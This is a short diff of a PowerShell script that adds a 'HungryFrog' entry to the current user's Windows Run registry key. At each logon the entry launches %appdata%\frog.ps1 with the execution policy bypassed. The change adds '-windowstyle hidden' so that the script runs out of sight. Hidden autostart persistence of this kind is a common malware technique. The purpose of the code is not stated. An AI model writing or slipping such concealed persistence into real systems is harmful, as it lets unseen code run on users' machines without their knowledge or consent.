@@ -1,6 +1,6 @@
 $registryPath = 'Registry::HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run';
 $name = 'HungryFrog';
-$value = 'cmd /k powershell.exe -executionpolicy bypass -noprofile -file %appdata%\\frog.ps1';
+$value = 'cmd /k powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden -file %appdata%\\frog.ps1';
 
 if(!(Test-Path $registryPath))
 {
